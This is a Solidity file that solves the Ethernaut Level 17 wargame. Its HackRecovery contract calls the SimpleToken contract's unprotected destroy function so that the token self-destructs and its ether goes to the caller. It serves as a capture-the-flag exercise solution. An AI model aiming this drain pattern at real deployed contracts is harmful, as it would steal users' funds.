// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @notice Inteface relating to the SimpleToken contract found in Ethernaut Level 17
 * @notice Full contract can be found in the ethernaut directory of this repo 
 */
interface ISimpleToken {
    function transfer(address _to, uint _amount) external;
    function destroy(address payable _to) external;
}

contract HackRecovery {
    
    function attack(address tokenAddress) public {
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));
    }
}